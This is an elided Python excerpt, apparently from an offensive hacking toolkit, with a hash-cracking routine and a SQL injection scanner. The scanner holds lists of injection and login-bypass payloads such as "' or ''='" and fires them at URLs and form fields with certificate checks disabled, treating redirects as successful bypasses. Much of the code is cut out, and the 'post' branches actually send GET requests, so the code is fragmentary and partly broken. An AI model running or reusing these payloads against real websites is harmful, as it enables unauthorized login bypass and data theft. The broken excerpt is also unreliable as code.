...
def dictionary_hash(my_file, my_hash, hash_type = "sha1"):
    ...
    if hash_type == "sha256":
        print(color + "cracking sha256 hash")
        ...
        try:
            ...
            if status == 200:
                ...
                if len(my_request) > 25000000:
                    print(color + "too long" + ": " + str(website_list[tracker]))
...
def sql_injection_scanner(url, secure = True, bot = False):
    ...
    boolean_sql = ["' or ''='", '" or ""="', 'support" or "1" = "1', "support' or '1' = '1", "support@" + str(email_mal) + '" or "1" = "1', "support@" + str(email_mal) + "' or '1' = '1"]
    mal_sql = ["\"", "\'", ";", "*", "'or''='", '"or""="', "='or''='", '="or""="', 'support"or"1"="1', "support'or'1'='1", "support@" + str(email_mal) + '"or"1"="1', "support@" + str(email_mal) + "'or'1'='1", '=support"or"1"="1', "=support'or'1'='1", "=support@" + str(email_mal) + '"or"1"="1', "=support@" + str(email_mal) + "'or'1'='1"]
    mal_password = '" or ""="'
        ...
        for c in mal_sql:
            ...
            try:
                ...
                if len(result.text) <= 25000000:
                    ...
                    get = web_session.get(new_url, verify = False, headers = user_agent, timeout = (5, 30))

                    if get.url != new_url and get.status_code == 200:
                        print(color + "true: " + str(get.url) + " " + str(get) + " " + new_url)
                        my_list.append("true: " + str(get.url) + " " + str(get) + " " + new_url)
                        ...
                        if password_search:
                            for boolean_mal in boolean_sql:
                                try:
                                    ...
                                    get = web_session.get(my_url, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).url

                                    if get != my_url:
                                        print(color + "true: " + boolean_mal + " " + url + " form: " + forms + " " + get)
                                        my_list.append("true: " + boolean_mal + " " + url + " form: " + forms + " " + get)
                        ...
                        if password_search:
                            for boolean_mal in boolean_sql:
                                try:
                                    ...
                                    post = web_session.get(my_url, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).url

                                    if post != my_url:
                                        print(color + "true: " + boolean_mal + " " + url + " form: " + forms + " " + post)
                                        my_list.append("true: " + boolean_mal + " " + url + " form: " + forms + " " + post)
                            ...
                            if password_search:
                                for boolean_mal in boolean_sql:
                                    try:
                                        ...
                                        get = web_session.get(j, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).url
                            ...
                            if password_search:
                                for boolean_mal in boolean_sql:
                                    try:
                                        ...
                                        post = web_session.get(j, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).url
